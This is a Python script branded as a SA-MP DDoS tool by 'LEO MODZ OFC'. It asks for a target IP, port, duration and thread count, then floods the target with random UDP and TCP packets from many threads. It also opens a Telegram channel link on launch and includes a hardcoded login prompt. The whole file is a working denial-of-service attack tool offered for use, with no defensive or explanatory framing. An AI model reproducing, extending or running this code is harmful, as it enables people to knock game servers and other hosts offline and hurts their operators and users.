#AUTHOR SAMP NUDOS
import random
import socket
import threading
import os
import sys
import time

###### MESSAGE MIKA ON TOP! #####
os.system("clear")
os.system("xdg-open https://t.me/LEOMODZOFC")
print("\u001b[35m BEM VINDO SA-MP DDOS BY LEO MODZ OFC")
time.sleep(2)
print("Loading.......")
os.system("clear")

#### Login       

attemps = 0

while attemps < 100:
    username = input('Enter your username: ')
    password = input('Enter your password: ')

    if username == 'LEO' and password == 'MODZ':
        print('LOGADO COM SUCESSO BEM VINDO DEVOLTA LEO MODZ!!')
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue
os.system("clear")

print("""
\u001b[35m
#  _       ______   ____    __  __  ______  _   _  _    _    _____   ____   __  __  __  __  _    _  _   _  _____  _______ __     __ #
# | |     |  ____| / __ \  |  \/  ||  ____|| \ | || |  | |  / ____| / __ \ |  \/  ||  \/  || |  | || \ | ||_   _||__   __|\ \   / / #
# | |     | |__   | |  | | | \  / || |__   |  \| || |  | | | |     | |  | || \  / || \  / || |  | ||  \| |  | |     | |    \ \_/ / #
# | |     |  __|  | |  | | | |\/| ||  __|  | . ` || |  | | | |     | |  | || |\/| || |\/| || |  | || . ` |  | |     | |     \   / #
# | |____ | |____ | |__| | | |  | || |____ | |\  || |__| | | |____ | |__| || |  | || |  | || |__| || |\  | _| |_    | |      | | #
# |______||______| \____/  |_|  |_||______||_| \_| \____/   \_____| \____/ |_|  |_||_|  |_| \____/ |_| \_||_____|   |_|      |_| #
""")

ip = str(input(" IP DO SERVER :"))
port = int(input(" PORTA DO SERVER :"))
choice = str(input(" (y/n) :"))
times = int(input(" TEMPO :"))
threads = int(input(" Tópicos :"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"Ataque enviado!!!")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(999)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"Ataque Enviado!!!")
		except:
			s.close()
			print("[*] Error!!!")
            

def run3():
	data = random._urandom(818)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"Ataque enviado!!!")
		except:
			s.close()
			print("[*] Error!!!")
            
  
def run4():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"Ataque enviado!!!")
		except:
			s.close()
			print("[*] Error!!!")
											
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
else:
		th = threading.Thread(target = run4)
		th.start()
